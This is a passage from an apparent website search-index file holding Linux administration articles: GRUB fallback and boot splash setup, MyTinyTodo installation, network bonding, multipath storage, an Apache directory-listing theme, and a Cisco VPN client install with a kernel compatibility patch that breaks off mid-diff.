(2.6.32-220.4.2.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-220.4.2.el6.x86_64 ro root=/dev/mapper/myvg-rootvol rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_NO_MD quiet SYSFONT=latarcyrheb-sun16 rhgb crashkernel=auto rd_LVM_LV=myvg/rootvol rd_NO_DM initrd /initramfs-2.6.32-220.4.2.el6.x86_64.img savedefault fallback title Red Hat Enterprise Linux Server (2.6.32-220.2.1.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-220.2.1.el6.x86_64 ro root=/dev/mapper/myvg-rootvol rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_NO_MD quiet SYSFONT=latarcyrheb-sun16 rhgb crashkernel=auto rd_LVM_LV=myvg/rootvol rd_NO_DM initrd /initramfs-2.6.32-220.2.1.el6.x86_64.img savedefault fallback title Red Hat Enterprise Linux (2.6.32-220.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-220.el6.x86_64 ro root=/dev/mapper/myvg-rootvol rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_NO_MD quiet SYSFONT=latarcyrheb-sun16 rhgb crashkernel=auto rd_LVM_LV=myvg/rootvol rd_NO_DM initrd /initramfs-2.6.32-220.el6.x86_64.img savedefault A few explanations:\nsavedefault fallback: this line indicates that this is one of the kernels we will use in case of problems fallback 0 1: specifies that we want to boot on kernel 0 then 1 where savedefault lines are present Installing a Boot Splash linkIntroduction linkLooks nice, right? Want one too? Let’s go… You must first have this compiled at the kernel level:\nCONFIG_FRAMEBUFFER_CONSOLE=y CONFIG_FRAMEBUFFER_CONSOLE_ROTATION=y Once that’s done, we can move on to the next step.\nInstallation linkInstall this:\napt-get install bootsplash bootsplash-theme-debian grub-splashimages Configuration linkGRUB Resolution linkTo change the size of grub terminals (getty), edit the file /boot/grub/menu.lst:\n# defoptions= Replace it with this:\n# defoptions=vga=791 quiet splash Keep the “#”, it’s important!\nSplashimages linkHere’s an example to insert in /boot/grub/menu.lst:\n## Splashimages splashimage=(hd0,1)/grub/splashimages/fiesta.xpm.gz Replace (hd0,1) with the one for your boot disk (/boot)\nValidation linkFinally, you need to validate your configuration:\nupdate-grub If you did everything right, when returning to your configuration you should see your new parameters that haven’t moved. If they have disappeared, you made an error in your configuration.\nConverting an Image for Grub linkIf you want to convert an image for use in grub:\nconvert image123.png -colors 14 -resize 640x480 grubimg.xpm Size must be: 640x480 pixels Only 14 colors In XPM format Move it to the right place and then insert it into your grub:\n## Splashimages splashimage=(hd0,1)/grub/splashimages/grubimg.xpm References linkhttp://www.debianaddict.org/article67.html http://www.gnu.org/software/grub/manual/legacy/Booting-fallback-systems.html http://www.linuxscrew.com/2012/04/24/grub-fallback-boot-good-kernel-if-new-one-crashes/?utm_source=feedburner\u0026utm_medium=feed\u0026utm_campaign=Feed%3A+linuxscrew+%28LinuxScrew%3A+Linux+Blog%29\n"
            }
        );
    index.add(
            {
                id:  341 ,
                href: "\/MyTinyTodo_:_Un_outil_simple_de_gestion_de_t%C3%A2ches\/",
                title: "MyTinyTodo: A Simple Task Management Tool",
                description: "How to install and configure MyTinyTodo, a simple web-based task management tool that's compatible with smartphones.",
                content: " Software version 1.4.2 Operating System Debian 6 Website MyTinyTodo Website Last Update 20/04/2012 Introduction linkI’ve been looking for a long time for a simple tool that I could host myself, web-based and compatible with smartphones. MyTinyTodo is made for that. Setting it up is very easy, as you’ll see…\nInstallation link wget http://www.mytinytodo.net/latest.php unzip latest.php chown -Rf www-data. mytinytodo rm -f latest.php Configuration linkYou’ll need to create a user and database beforehand, then start the installation by connecting to your website, for example: http://www.deimos.fr/mytinytodo\nOnce the installation is complete, delete the setup file:\nrm -f mytinytodo/setup.php References linkhttp://www.mytinytodo.net/\n"
            }
        );
    index.add(
            {
                id:  342 ,
                href: "\/R%C3%A9seau_:_cr%C3%A9er_un_bonding\/",
                title: "Network: Creating Bonding",
                description: "Learn how to configure network bonding in Linux for load balancing and fault tolerance with different operation modes and configuration methods.",
                content: "Introduction linkChannel bonding, also known as Port Trucking, allows applying a series of predefined policies on a group of network links combined into one. This group of network interfaces gives you the ability to perform load balancing and especially fault tolerance. Seven operation modes are available to combine necessity and flexibility. In this article, we will explore the possibilities offered and their implementation.\nInstallation linkPrerequisites linkTwo prerequisites appear at the network switch level, where the interfaces are connected:\nSupport and configuration of “port trunking” mode on the used ports Support for IEEE 802.3ad standard For your Linux system, you need: Network cards (preferably compatible with ethtools and miitools).\nBonding module for the kernel.\nKernel 2.4.x [*] Network device support Bonding driver support Kernel 2.6.x [*] Networking support Bonding driver support aptitude install ifenslave-2.6 ethtools and miitools linkThe bonding driver can only use one interface if a cable is disconnected. Since hardware failures are the most common on a server, this provides high availability. Note that there are two small tools for querying the ETHTOOL and MII registers of network cards. The tools are mii-tool (from the net-tools package) and ethtool. Not all interfaces support these registers; in this case, we cannot detect disconnection (there is a solution using ARP requests, but that’s beyond the scope of this article). To use this bonding function, you need to use modes such as active-backup; for more info, read the documentation :).\nMII link \u003e mii-tool eth0 eth0: negotiated 100baseTx-FD, link ok \u003e mii-tool eth1 eth1: negotiated 100baseTx-FD flow-control, link ok Ethtool linkWith the Intel Pro dual card:\n\u003e ethtool eth2 Settings for eth2: Supported ports: TP MII Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full Supports auto-negotiation: Yes Advertised link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full Advertised auto-negotiation: Yes Speed: 100Mb/s Duplex: Full Port: Twisted Pair PHYAD: 1 Transceiver: internal Auto-negotiation: on Supports Wake-on: pg Wake-on: d Link detected: yes With the 3Com card, it doesn’t work:\n\u003e ethtool eth0 Settings for eth0: No data available The Different Modes linkIn this chapter, we’ll see the different modes offered by the bonding module:\nName Mode Description balance-rr: load balancing 0 With load balancing, packets travel on one active network card, then on another, sequentially. The bandwidth is increased. If one of the network cards fails, the load balance skips this card and continues to rotate cyclically. active-backup: active backup 1 This mode is simple redundancy with failover. Only one interface is active. As soon as its failure is detected, another interface is activated and takes over. Your bandwidth does not change. balance-xor: Xor balance 2 An interface is assigned to send to the same MAC address. Thus transfers are parallelized and the choice of the interface follows the rule: (Source MAC address XOR Destination MAC address) modulo number of interfaces. broadcast: broadcast 3 No particularity in this case, all data is transmitted on all active interfaces. No other rule. 802.3ad: 802.3ad standard 4 The 802.3ad standard allows link aggregation, dynamically expanding bandwidth. Groups are created dynamically based on common parameters. balance-tlb: TLB balance 5 “TLB” for Traffic Load Balancing. Outgoing traffic is distributed according to the current load (calculated relative to the speed) of each interface. Incoming traffic is received by the current interface. If the receiving interface becomes inactive, another interface takes the MAC address of the inactive interface. balance-alb: ALB balance 6 “ALB” for Adaptive load balancing. This is an extended mode of tlb balance, which includes receiving load balancing. Receive load balancing is performed at the ARP response level. The module intercepts ARP responses and changes the MAC address to that of one of the interfaces. Implementation linkPresentation with a Script linkWARNING: I use mode0! This is only possible if each interface is on a different switch, otherwise beware of packet duplication.\nLet’s see a minimal script:\n#!/bin/bash #Loading the bonding module. modprobe bonding mode=0 miimon=100 # We close the two ethernet interfaces ifconfig eth0 down ifconfig eth1 down # We create a bond0 interface, which receives a dummy Mac address (this will change) ifconfig bond0 # We start the interface, as if it were an ethernet interface ifconfig bond0 192.168.0.4 netmask 255.255.255.0 # We add the interfaces to bond0 ifenslave bond0 eth0 ifenslave bond0 eth1 Let’s look closer:\nModule loading: Two options were included here: mode (load balancing round-robin) and miimon (Interface monitoring frequency) It’s possible to put in the /etc/modules.conf file the loading of the bonding module or in /etc/modprobe.d/arch/i386:\nalias bond0 bonding options bond0 mode=0 miimon=100 This first example shows the case of a single bonding. It is indeed possible to have multiple bondings with different modes. For this, let’s modify the /etc/modules.conf accordingly:\nalias bond0 bonding options bond0 -o bond0 mode=2 miimon=100 primary=eth1 max_bonds=2 primary=eth1: forces eth1 interface to be primary max_bonds=2: allows having 2 bonds (so 4 interfaces but 2 bonds). Just increase this number if you want several bonds. -o bond0: this is essential if you want to use multiple bonds! You will then need to specify bond0, bond1, bond2… Adding Interfaces to bond0 linkThe ifenslave command allows us to add ethernet interfaces to bond0 (then called slave interfaces). When adding the first network interface to bond0, the latter takes the MAC address of that interface. The other interfaces then lose their MAC addresses, covered by that of the bond0 interface.\nTo remove an interface, simply run the command:\nifenslave -d bondx ethx The bonding module then gives ethX back its real MAC address. If we remove the first MAC address (the one used by bond0), then bond0 retrieves that of eth1.\nTo verify our bonding:\n\u003e cat /proc/net/bonding/bond0 Ethernet Channel Bonding Driver: v2.5.0 (December 1, 2003) Bonding Mode: load balancing (round-robin) MII Status: up MII Polling Interval (ms): 0 Up Delay (ms): 0 Down Delay (ms): 0 Slave Interface: eth0 MII Status: up Link Failure Count: 0 Slave Interface: eth1 MII Status: up Link Failure Count: 0 Automatic Configuration Files link Debian RedHat Here are the files to modify to load your configuration at startup, add to /etc/modules.conf or /etc/modprobe.d/arch/i386:\nalias bond0 bonding options bond0 mode=0 miimon=100 In /etc/network/interfaces for active-backup:\nauto bond0 iface bond0 inet static address 10.31.1.5 netmask 255.255.255.0 network 10.31.1.0 gateway 10.31.1.254 slaves eth0 eth1 bond_mode active-backup bond_miimon 100 bond_downdelay 200 bond_updelay 200 Or for 802.3ad in /etc/network/interfaces :\nauto lo iface lo inet loopback auto bond0 iface bond0 inet static address 192.168.1.1 netmask 255.255.255.0 gateway 192.168.1.254 network 192.168.1.0 bond-slaves enp1s0 enp2s0 bond-mode 4 bond-miimon 100 bond-downdelay 200 bond-updelay 200 If you are on RHEL 6, in the file /etc/modprobe.d/bonding.conf, create the following line:\nalias bond0 bonding If you are on RHEL \u003c6, it will be in the /etc/modprobes.conf file that you will need to insert this same content.\nIn /etc/sysconfig/network-script/, create the ifcfg-bond0 file to enter the bonding configuration:\nDEVICE=bond0 IPADDR=192.168.0.104 NETMASK=255.255.255.0 GATEWAY=192.168.0.1 ONBOOT=yes BOOTPROTO=static BONDING_OPTS=\"mode 1\" Then we will move on to our network interfaces to tell them that they will be used for bonding:\nDEVICE=eth0 MASTER=bond0 ONBOOT=yes SLAVE=yes BOOTPROTO=static Do the same for interface 1:\nDEVICE=eth1 MASTER=bond0 ONBOOT=yes SLAVE=yes BOOTPROTO=static Bonding Module Options linkHere is a series of the most commonly used options for the bonding module that allow fine-tuning the operation of your bonding:\nParameter Description Primary Only for active-backup. Prioritizes a slave interface. It will become active again as soon as it can, even if another interface is active. updelay (0 by default) Latency time between discovering the reconnection of an interface and its re-use. downdelay (0 by default) Latency time between discovering the disconnection of an interface and its deactivation from bond0. miimon (0 by default) Frequency of monitoring interfaces by Mii or ethtool. The recommended value is 100. use_carrier (1 by default) Specifies the use of interface monitoring by miitool or by the network card itself (requires integrated instructions). arp_interval (in ms) ARP monitoring system, avoiding the use of miitool and ethtool. If no frame arrives during the arp_interval, up to 16 ARP requests are sent through this interface to 16 IP addresses. If no response is obtained, the interface is deactivated. arp_ip_target List of IP addresses, separated by a comma, used by ARP monitoring. If none is specified, ARP monitoring is inactive. If you want the complete list of options, you can get it this way:\n\u003e modinfo bonding filename: /lib/modules/2.6.32-220.el6.x86_64/kernel/drivers/net/bonding/bonding.ko author: Thomas Davis, tadavis@lbl.gov and many others description: Ethernet Channel Bonding Driver, v3.6.0 version: 3.6.0 license: GPL srcversion: B956376CB253D2B7312733C depends: ipv6 vermagic: 2.6.32-220.el6.x86_64 SMP mod_unload modversions parm: max_bonds:Max number of bonded devices (int) parm: tx_queues:Max number of transmit queues (default = 16) (int) parm: num_grat_arp:Number of gratuitous ARP packets to send on failover event (int) parm: num_unsol_na:Number of unsolicited IPv6 Neighbor Advertisements packets to send on failover event (int) parm: miimon:Link check interval in milliseconds (int) parm: updelay:Delay before considering link up, in milliseconds (int) parm: downdelay:Delay before considering link down, in milliseconds (int) parm: use_carrier:Use netif_carrier_ok (vs MII ioctls) in miimon; 0 for off, 1 for on (default) (int) parm: mode:Mode of operation; 0 for balance-rr, 1 for active-backup, 2 for balance-xor, 3 for broadcast, 4 for 802.3ad, 5 for balance-tlb, 6 for balance-alb (charp) parm: primary:Primary network device to use (charp) parm: primary_reselect:Reselect primary slave once it comes up; 0 for always (default), 1 for only if speed of primary is better, 2 for only on active slave failure (charp) parm: lacp_rate:LACPDU tx rate to request from 802.3ad partner; 0 for slow, 1 for fast (charp) parm: ad_select:803.ad aggregation selection logic; 0 for stable (default), 1 for bandwidth, 2 for count (charp) parm: xmit_hash_policy:balance-xor and 802.3ad hashing method; 0 for layer 2 (default), 1 for layer 3+4, 2 for layer 2+3 (charp) parm: arp_interval:arp interval in milliseconds (int) parm: arp_ip_target:arp targets in n.n.n.n form (array of charp) parm: arp_validate:validate src/dst of ARP probes; 0 for none (default), 1 for active, 2 for backup, 3 for all (charp) parm: fail_over_mac:For active-backup, do not set all slaves to the same MAC; 0 for none (default), 1 for active, 2 for follow (charp) parm: all_slaves_active:Keep all frames received on an interfaceby setting active flag for all slaves; 0 for never (default), 1 for always. (int) parm: resend_igmp:Number of IGMP membership reports to send on link failure (int) Some Examples linkA simple redundancy with priority on eth1:\n#!/bin/bash modprobe bonding -o bond0 mode=1 miimon=100 priority=eth1 ifconfig eth0 down ifconfig eth1 down ifconfig bond0 ifconfig bond0 192.168.0.4 netmask 255.255.255.0 ifenslave bond0 eth0 ifenslave bond0 eth1 Load balancing with ARP request verification:\n#!/bin/bash modprobe bonding -o bond1 mode=0 arp_interval=1000 arp_ip_target=x.x.x.x ifconfig eth0 down ifconfig eth1 down ifconfig eth2 down ifconfig bond1 ifconfig bond1 192.168.1.5 netmask 255.255.255.0 ifenslave bond1 eth0 ifenslave bond1 eth1 ifenslave bond1 eth2 Summary Table of Modes linkHere are the different modes offered by the bonding module with load balancing support:\nMode Load-Balancing 0 incoming 1 none 2 incoming 3 none 4 none 5 incoming 6 incoming and outgoing Conclusion linkNetwork card redundancy is often perceived as useless and expensive despite a simple installation. With these 7 modes of operation, you have the ability to obtain a high availability network interface, even responding to specific needs for load balancing. So why not take advantage of it?\nOther Documentation linkBonding documentation on Ubuntu\nhttp://www.linux-foundation.org/en/Net:Bonding\nNIC Bonding On Debian Lenny\nhttp://bisscuitt.blogspot.fr/2007/10/redhat-linux-rhel-4-nic-bonding.html\n"
            }
        );
    index.add(
            {
                id:  343 ,
                href: "\/Multipath_:_configurer_plusieurs_chemins_pour_ses_acc%C3%A8s_disques_externe\/",
                title: "Multipath: Configuring Multiple Paths for External Disk Access",
                description: "Learn how to set up multipath I/O for external storage access, using device mappers to create redundant paths to your disk storage for improved reliability and performance.",
                content: "Introduction linkWe will discuss two topics here:\nDevice mappers Multipathing We need to understand how device mappers work before tackling multipathing, which is why there will be an explanation of both in this documentation.\nIn the Linux kernel, the device mapper serves as a generic framework for mapping one block device (“mapping” the device) to another. It is the foundation for LVM2 and EVMS, software RAIDs, or disk encryption; and offers additional features such as file system snapshots. The device mapper works by processing data transferred to it by a virtual block device (provided by itself), and passing the resulting data to another block device.\nMultipathing allows you to have multiple paths to access the same data. This aims to increase data access capabilities if the storage equipment allows it (active/active) and to ensure redundancy in case of equipment failure, such as a controller. Here is what a multipath architecture looks like:\nIt also works very well with a single SAN.\nDevice Mapper linkDevice mappers are rarely used manually. They are generally used by higher layers such as LVM. Nevertheless, we’ll see how to use them.\nTo add a partition in device mapper:\ndmsetup create device: name of the device to create map_table: a file that must contain mapping rules, for example: 0 409600 linear /dev/sdal 0 409600 2048000 linear /dev/sda2 0 If I want to create a device mapper, I can also do it in a single command line without a file:\necho \"0 `blockdev --getsize /dev/sda1` linear /dev/sda1 0\" | dmsetup create mynewdm There are several types of mapping targets:\nlinear: continuous allocation stripped: segmented allocation between all devices error: to generate errors (ideal for development and testing) snapshot - copy-on-write device snapshot-origin: mapping to an original volume zero - sparse block devices (equivalent to /dev/null) multipath: multiple routes for connection to a device To see all available device mappers:\n\u003e dmsetup table myvg-rootvol: 0 10092544 linear 8:3 2048 To delete a device mapper:\ndmsetup remove To list all device mappers as a tree:\ndmsetup ls --tree Multipathing linkInstallation linkMultipath is not installed by default, so we need to install a package:\nyum install device-mapper-multipath Then we will load the modules and make the service persistent:\nmodprobe dm_multipath modprobe dm-round-robin chkconfig multipathd on Configuration linkIf you don’t have a configuration file, get one from the documentation:\ncp /usr/share/doc/device-mapper-multipath-0.4.9/multipath.conf /etc/ Multipath uses a group notion ranging from 0 to 1024 (from highest to lowest priority). Only one group is active at a time. A group can contain multiple paths.\nLet’s proceed with configuring our multipathing service (I’m only showing the essential lines):\n... # Blacklist all devices by default. Remove this to enable multipathing # on the default devices. #blacklist { # devnode \"*\" #} ## Use user friendly names, instead of using WWIDs as names. defaults { user_friendly_names yes } ## ## Here is an example of how to configure some standard options. ## # defaults { udev_dir /dev polling_interval 10 selector \"round-robin 0\" path_grouping_policy multibus getuid_callout \"/lib/udev/scsi_id --whitelisted --device=/dev/%n\" prio alua path_checker readsector0 rr_min_io 100 max_fds 8192 rr_weight priorities failback immediate no_path_retry fail user_friendly_names yes } blacklist { wwid 26353900f02796769 devnode \"^(ram|raw|loop|fd|md|dm-|sr|scd|st)[0-9]*\" devnode \"^hd[a-z]\" } ... I strongly recommend checking the man pages for the options above.\nWe can now start our service:\nservice multipathd start Usage linkHere is the order and tools to use for disk detection, this section is very important:\nDevices: partprobe /dev/ (e.g., sda) Device-mappers: kpartx -a /dev/ (e.g., dm-1) Multipath: partprobe /dev/mapper/ (e.g., mpath0) To see active paths:\nmultipath -l To create partitions on a multipathed device mapper, you must do it on the underlying disk (e.g., /dev/sda) and not on the multipathed device mapper! So the procedure is to create your partition with fdisk for example, then detect your new partition:\npartprobe /dev/sda partprobe /dev/sdb kpartx -a /dev/mapper/mpath0 FAQ linkI still don’t see my new LUNs, how do I refresh them? linkIt is possible that creating new LUNs/partitions requires a new scan to detect them. We will need this package:\nyum install sg3_utils Then let’s launch the scan:\nrescan-scsi-bus.sh Or alternatively, we can do it directly with /proc:\nIf it’s on a SCSI type platform: echo \"- - -\" \u003e /sys/class/scsi_host//scan If it’s for a Fiber Channel array: echo \"1\" \u003e /sys/class/fc_host//issue_lip echo \"- - -\" \u003e /sys/class/scsi_host//scan I can’t see my new partition correctly, how should I proceed? linkHere’s how to proceed when encountering an issue while creating a partition on a multipath. Let’s take this example:\nI don’t see mpath0p2 on one machine, whereas I can see it on other machines: \u003e ls /dev/mpath/ mpath0 mpath0p1 I verify that I can see my partition on both paths (sda2 and sdb2): \u003e fdisk -l Disk /dev/hda: 8589 MB, 8589934592 bytes 255 heads, 63 sectors/track, 1044 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/hda1 * 1 13 104391 83 Linux /dev/hda2 14 274 2096482+ 8e Linux LVM /dev/hda3 275 339 522112+ 82 Linux swap / Solaris Disk /dev/sda: 5368 MB, 5368709120 bytes 166 heads, 62 sectors/track, 1018 cylinders Units = cylinders of 10292 * 512 = 5269504 bytes Device Boot Start End Blocks Id System /dev/sda1 1 10 51429 83 Linux /dev/sda2 11 770 3910960 8e Linux LVM Disk /dev/sdb: 5368 MB, 5368709120 bytes 166 heads, 62 sectors/track, 1018 cylinders Units = cylinders of 10292 * 512 = 5269504 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 10 51429 83 Linux /dev/sdb2 11 770 3910960 8e Linux LVM Disk /dev/dm-1: 5368 MB, 5368709120 bytes 166 heads, 62 sectors/track, 1018 cylinders Units = cylinders of 10292 * 512 = 5269504 bytes Device Boot Start End Blocks Id System /dev/dm-1p1 1 10 51429 83 Linux Disk /dev/dm-2: 52 MB, 52663296 bytes 255 heads, 63 sectors/track, 6 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Disk /dev/dm-2 doesn't contain a valid partition table Make sure there are no blacklist options in the configuration preventing you from properly seeing the devices. To do this, we’ll comment out all blacklist parts:\n#blacklist { # wwid 26353900f02796769 # devnode \"^(ram|raw|loop|fd|md|dm-|sr|scd|st)[0-9]*\" # devnode \"^hd[a-z]\" #} We see that /dev/dm-1p1 is present, but not the 2nd one (at least there’s an error). I check again that there is no presence of my dm-2: \u003e ls -l /dev/dm-1 brw-rw---- 1 root root 253, 1 Mar 1 13:42 /dev/dm-1 \u003e ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 62 Mar 1 13:41 control brw-rw---- 1 root disk 253, 1 Mar 1 13:42 mpath0 brw-rw---- 1 root root 253, 2 Mar 1 14:06 mpath0p1 brw------- 1 root root 253, 0 Mar 1 13:41 myvg0-mylv0 We see that “253, 1” corresponds to /dev/dm-1. We’ll do a kpartx and partprobe on both to refresh the paths: kpartx -a /dev/dm-1 kpartx -a /dev/dm-2 partprobe /dev/mapper/mpath0 Even if you get errors like:\ndevice-mapper: create ioctl failed: Device or resource busy It’s not serious, it allows it to refresh the list of device mappers.\nAnd now it works: \u003e ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 62 Mar 1 13:41 control brw-rw---- 1 root disk 253, 1 Mar 1 13:42 mpath0 brw-rw---- 1 root root 253, 2 Mar 1 14:06 mpath0p1 brw-rw---- 1 root disk 253, 3 Mar 1 14:19 mpath0p2 brw------- 1 root root 253, 0 Mar 1 13:41 myvg0-mylv0 Resources linkhttp://docs.redhat.com/docs/en-US/Red_Hat_Enterprise_Linux/5/html-single/DM_Multipath/index.html\n"
            }
        );
    index.add(
            {
                id:  344 ,
                href: "\/Theme_pour_le_Directory_Index_Listing_d%5C%27Apache\/",
                title: "Theme for Apache Directory Index Listing",
                description: "How to create a custom theme for Apache's Directory Index Listing to improve its appearance.",
                content: " Software version 1.0 Operating System Debian 6 Website Website Last Update 09/04/2012 Introduction linkThe default Apache directory index listing is… (we can say it)… very ugly. Here is a theme I found on this site and which I have slightly modified. Here’s a preview:\nInstallation linkIt’s easy to install. Let’s say we want to place it in /var/www/include to make things easier:\nwget /var/www/ http://www.deimos.fr/blocnotesinfo/images/f/f8/Directory_index_theme.tgz tar -xzf Directory_index_theme.tgz rm -f Directory_index_theme.tgz chown -Rf www-data. include Configuration linkNow we just need to configure Apache. Again, we’ll keep things simple and modify Apache’s base file:\nServerAdmin webmaster@localhost DocumentRoot /var/www Options FollowSymLinks AllowOverride None Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all Alias /icons/ /var/www/include/icons/ Alias /include/ /var/www/include/ Options Indexes FollowSymLinks IndexOptions +FancyIndexing IndexOptions +VersionSort IndexOptions +HTMLTable IndexOptions +FoldersFirst IndexOptions +IconsAreLinks IndexOptions +IgnoreCase IndexOptions +SuppressDescription IndexOptions +SuppressHTMLPreamble IndexOptions +XHTML IndexOptions +IconWidth=16 IndexOptions +IconHeight=16 IndexOptions +NameWidth=* IndexOptions +DescriptionWidth=200 IndexOrderDefault Descending Date HeaderName /include/header.html ReadmeName /include/footer.html AddIcon /icons/type_application.png .exe .app .EXE .APP AddIcon /icons/type_binary.png .bin .hqx .uu .BIN .HQX .UU AddIcon /icons/type_box.png .tar .tgz .tbz .tbz2 bundle .rar .TAR .TGZ .TBZ .TBZ2 AddIcon /icons/type_rar.png .rar .RAR AddIcon /icons/type_html.png .htm .html .HTM .HTML AddIcon /icons/type_code.png .htx .htmls .dhtml .phtml .shtml .inc .ssi .c .cc .css .h .rb .js .rb .pl .py .sh .shar .csh .ksh .tcl .as AddIcon /icons/type_database.png .db .sqlite AddIcon /icons/type_disc.png .iso .image AddIcon /icons/type_document.png .ttf AddIcon /icons/type_excel.png .xlsx .xls .xlm .xlt .xla .xlb .xld .xlk .xll .xlv .xlw AddIcon /icons/type_flash.png .flv AddIcon /icons/type_illustrator.png .ai .eps .epsf .epsi AddIcon /icons/type_pdf.png .pdf AddIcon /icons/type_php.png .php .phps .php5 .php3 .php4 .phtm AddIcon /icons/type_photoshop.png .psd AddIcon /icons/type_monitor.png .ps AddIcon /icons/type_powerpoint.png .ppt .pptx .ppz .pot .pwz .ppa .pps .pow AddIcon /icons/type_swf.png .swf AddIcon /icons/type_text.png .tex .dvi AddIcon /icons/type_vcf.png .vcf .vcard AddIcon /icons/type_word.png .doc .docx AddIcon /icons/type_zip.png .Z .z .tgz .gz .zip AddIcon /icons/type_globe.png .wrl .wrl.gz .vrm .vrml .iv AddIcon /icons/type_android.gif .apk .APK AddIconByType (TXT,/icons/type_text.png) text/* AddIconByType (IMG,/icons/type_image.png) image/* AddIconByType (SND,/icons/type_audio.png) audio/* AddIconByType (VID,/icons/type_video.png) video/* AddIconByEncoding (CMP,/icons/type_box.png) x-compress x-gzip AddIcon /icons/back.png .. AddIcon /icons/information.png README INSTALL AddIcon /icons/type_folder.png ^^DIRECTORY^^ AddIcon /icons/blank.png ^^BLANKICON^^ DefaultIcon /icons/type_document.png ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ "
            }
        );
    index.add(
            {
                id:  345 ,
                href: "\/Cisco_VPN_Client_:_Installation_sur_une_Red_Hat_6\/",
                title: "Cisco VPN Client: Installation on Red Hat 6",
                description: "A guide to installing the Cisco VPN Client on Red Hat 6, including necessary patches and configurations",
                content: " Software version 4.8.02 Operating System RHEL 6.2 Website Cisco Website Last Update 06/04/2012 Introduction linkInstalling the Cisco VPN Client on Linux can be quite challenging! That’s why I decided to create this documentation where you just need to copy and paste the commands.\nPrerequisites linkYou’ll need all the tools required for compilation (gcc, g++…):\nyum install gcc glibc Installation linkLet’s download a version 4:\nwget http://projects.tuxx-home.at/ciscovpn/clients/linux/4.8.02/vpnclient-linux-x86_64-4.8.02.0030-k9.tar.gz Let’s extract everything:\ntar -xzvf vpnclient-linux-x86_64-4.8.02.0030-k9.tar.gz cd vpnclient Apply the following patch for 64-bit compatibility:\ndiff -urN vpnclient.orig/Makefile vpnclient/Makefile --- vpnclient.orig/Makefile\t2008-06-23 17:59:12.000000000 +0100 +++ vpnclient/Makefile\t2008-07-09 23:16:54.000000000 +0100 @@ -12,7 +12,9 @@ SOURCE_OBJS := linuxcniapi.o frag.o IPSecDrvOS_linux.o interceptor.o linuxkernelapi.o ifeq ($(SUBARCH),x86_64) -CFLAGS += -mcmodel=kernel -mno-red-zone +# Must NOT fiddle with CFLAGS +# CFLAGS += -mcmodel=kernel -mno-red-zone +EXTRA_CFLAGS += -mcmodel=kernel -mno-red-zone NO_SOURCE_OBJS := libdriver64.so else NO_SOURCE_OBJS := libdriver.so diff -urN vpnclient.orig/frag.c vpnclient/frag.c --- vpnclient.orig/frag.c\t2008-06-23 17:59:12.000000000 +0100 +++ vpnclient/frag.c\t2008-07-09 23:16:54.000000000 +0100 @@ -22,7 +22,9 @@ #include \"frag.h\" #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) -#define SKB_IPHDR(skb) ((struct iphdr*)skb-\u003enetwork_header) +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + */ +#define SKB_IPHDR(skb) ((struct iphdr*)skb_network_header) #else #define SKB_IPHDR(skb) skb-\u003enh.iph #endif diff -urN vpnclient.orig/interceptor.c vpnclient/interceptor.c --- vpnclient.orig/interceptor.c\t2008-06-23 17:59:12.000000000 +0100 +++ vpnclient/interceptor.c\t2008-07-09 23:34:51.000000000 +0100 @@ -637,19 +637,30 @@ reset_inject_status(\u0026pBinding-\u003erecv_stat); #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - if (skb-\u003emac_header) +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + */ + if (skb_mac_header_was_set(skb)) #else if (skb-\u003emac.raw) #endif { #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - hard_header_len = skb-\u003edata - skb-\u003emac_header; +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + */ + hard_header_len = skb-\u003edata - skb_mac_header(skb); #else hard_header_len = skb-\u003edata - skb-\u003emac.raw; #endif if ((hard_header_len \u003c 0) || (hard_header_len \u003e skb_headroom(skb))) { printk(KERN_DEBUG \"bad hh len %d\\n\", hard_header_len); + + printk(KERN_DEBUG \"bad hh len %d, mac: %d, data: %p, head: %p\\n\", + hard_header_len, + skb-\u003emac_header, /* actualy ptr in 32-bit */ + skb-\u003edata, + skb-\u003ehead); + hard_header_len = 0; } } @@ -664,7 +675,9 @@ { case ETH_HLEN: #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - CniNewFragment(ETH_HLEN, skb-\u003emac_header, \u0026MacHdr, CNI_USE_BUFFER); +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + */ + CniNewFragment(ETH_HLEN, skb_mac_header(skb), \u0026MacHdr, CNI_USE_BUFFER); #else CniNewFragment(ETH_HLEN, skb-\u003emac.raw, \u0026MacHdr, CNI_USE_BUFFER); #endif @@ -782,7 +795,9 @@ #endif //LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,4,0) reset_inject_status(\u0026pBinding-\u003esend_stat); #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - hard_header_len = skb-\u003enetwork_header - skb-\u003edata; +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + */ + hard_header_len = skb_network_header(skb) - skb-\u003edata; #else hard_header_len = skb-\u003enh.raw - skb-\u003edata; #endif diff -urN vpnclient.orig/linuxcniapi.c vpnclient/linuxcniapi.c --- vpnclient.orig/linuxcniapi.c\t2008-06-23 17:59:12.000000000 +0100 +++ vpnclient/linuxcniapi.c\t2008-07-09 23:16:54.000000000 +0100 @@ -338,8 +338,12 @@ skb-\u003eip_summed = CHECKSUM_UNNECESSARY; #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - 